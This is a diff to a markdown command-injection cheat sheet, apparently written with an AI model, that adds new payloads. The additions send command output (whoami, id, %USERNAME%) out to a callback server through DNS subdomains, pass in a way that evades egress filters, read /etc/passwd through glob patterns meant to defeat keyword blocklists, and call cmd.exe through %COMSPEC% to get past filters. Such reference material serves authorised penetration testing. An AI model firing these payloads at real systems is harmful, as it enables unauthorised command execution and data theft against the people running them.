@@ -80,9 +80,18 @@ No output returned. Inject a delay and measure response time:
 Trigger a DNS or HTTP callback to a controlled server. Use Burp Collaborator or interactsh:
 
 ```bash
-# Linux — DNS
+# Linux — DNS callback (confirm blind CI)
 127.0.0.1; nslookup <collaborator-url>
 127.0.0.1; curl http://<collaborator-url>/
+
+# Linux — DNS with data exfil (data as subdomain — evades HTTP egress filters)
+127.0.0.1; nslookup $(whoami).<collaborator-url>
+127.0.0.1; host $(whoami).<collaborator-url>
+# Data appears as the leftmost DNS label in your collaborator log
+# e.g. nslookup www-data.abc123.oast.fun → you see "www-data" in DNS query
+
+# Exfil multi-word output (replace spaces with dashes)
+127.0.0.1; nslookup $(id | tr ' ' '-').<collaborator-url>
 
 # Linux — HTTP with data exfil
 127.0.0.1; curl http://<collaborator-url>/$(whoami)
@@ -90,6 +99,7 @@ Trigger a DNS or HTTP callback to a controlled server. Use Burp Collaborator or 
 
 # Windows — DNS
 127.0.0.1& nslookup <collaborator-url>
+127.0.0.1& nslookup %USERNAME%.<collaborator-url>
 127.0.0.1& powershell -c "Invoke-WebRequest http://<collaborator-url>/"
 ```
 
@@ -138,6 +148,29 @@ ls${IFS}-la${IFS}/
 127.0.0.1${LS_COLORS:10:1}${IFS}whoami
 ```
 
+### Globbing (Linux) — Path/Command Obfuscation
+
+Shell glob expansion resolves wildcards before execution — avoids typing command names or paths literally:
+
+```bash
+# ? matches exactly one character
+/???/??t /etc/passwd       # /bin/cat (or /usr/cut etc.) — avoids writing "cat"
+/bin/c?t /etc/passwd       # matches cat, cut
+/usr/bin/who??i            # matches whoami
+
+# * matches any number of characters
+/bin/ca* /etc/passwd       # matches cat
+/usr/bin/who*              # matches whoami, whoever, etc.
+
+# Useful when the keyword itself is filtered:
+# "cat" blocked → /???/??t /etc/passwd
+# "id" blocked → /usr/bin/i?
+# "ls" blocked → /bin/l?
+
+# Works in argument injection too — bypass path filters
+/???/bin/bas? -c 'id'      # /usr/bin/bash -c 'id'
+```
+
 ### Character Tricks (Windows)
 
 | Payload | Returns |
@@ -146,6 +179,15 @@ ls${IFS}-la${IFS}/
 | `%HOMEPATH:~6,-11%` | `\` (CMD) |
 | `$env:HOMEPATH[0]` | `\` (PowerShell) |
 | `Get-ChildItem Env:` | All env vars |
+| `%COMSPEC%` | Full path to `cmd.exe` — bypass if `cmd` keyword is filtered |
+
+```cmd
+# %COMSPEC% as cmd.exe alias
+%COMSPEC% /c whoami
+%COMSPEC% /c "net user"
+
+# Useful if filter blocks the word "cmd" but not environment variable expansion
+```
 
 ---
 
@@ -539,5 +581,5 @@ $()
 ---
 
 *Created: 2026-03-02*
-*Updated: 2026-05-13*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
